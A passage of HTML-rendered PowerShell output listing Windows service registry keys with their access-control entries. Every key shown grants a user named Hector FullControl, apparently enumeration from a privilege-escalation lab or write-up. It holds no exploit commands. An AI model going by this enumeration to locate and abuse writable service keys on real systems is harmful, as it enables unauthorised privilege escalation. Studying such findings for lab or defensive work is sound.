AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\lltdio</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\lltdio</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\lltdsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\lltdsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\lmhosts</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\lmhosts</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Lsa</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Lsa</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSI_SAS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSI_SAS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSI_SAS2i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSI_SAS2i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSI_SAS3i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSI_SAS3i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSI_SSS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSI_SSS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSM</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LSM</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\luafv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\luafv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MapsBroker</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MapsBroker</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MariaDB</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MariaDB</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mausbhost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mausbhost</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mausbip</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mausbip</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\megasas</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\megasas</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\megasas2i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\megasas2i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\megasas35i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\megasas35i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\megasr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\megasr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Microsoft_Bluetooth_AvrcpTransport</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Microsoft_Bluetooth_AvrcpTransport</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mlx4_bus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mlx4_bus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MMCSS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MMCSS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Modem</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Modem</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\monitor</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\monitor</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mouclass</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mouclass</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mouhid</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mouhid</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mountmgr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mountmgr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mpsdrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mpsdrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mpssvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mpssvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mrxsmb</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mrxsmb</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mrxsmb20</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mrxsmb20</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsBridge</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsBridge</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSDTC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSDTC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSDTC Bridge 4.0.0.0</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSDTC Bridge 4.0.0.0</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Msfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Msfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\msgpiowin32</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\msgpiowin32</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mshidkmdf</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mshidkmdf</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mshidumdf</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mshidumdf</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\msisadrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\msisadrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSiSCSI</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSiSCSI</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\msiserver</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\msiserver</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSKSSRV</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSKSSRV</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsLbfoProvider</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsLbfoProvider</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsLldp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsLldp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSPCLOCK</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSPCLOCK</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSPQM</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSPQM</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsRPC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsRPC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSSCNTRS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSSCNTRS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsSecFlt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MsSecFlt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mssmbios</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mssmbios</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSTEE</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MSTEE</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MTConfig</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\MTConfig</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Mup</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Mup</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mvumis</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\mvumis</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\napagent</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\napagent</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NcaSvc</span><br><span class="line">PSParentPath            : 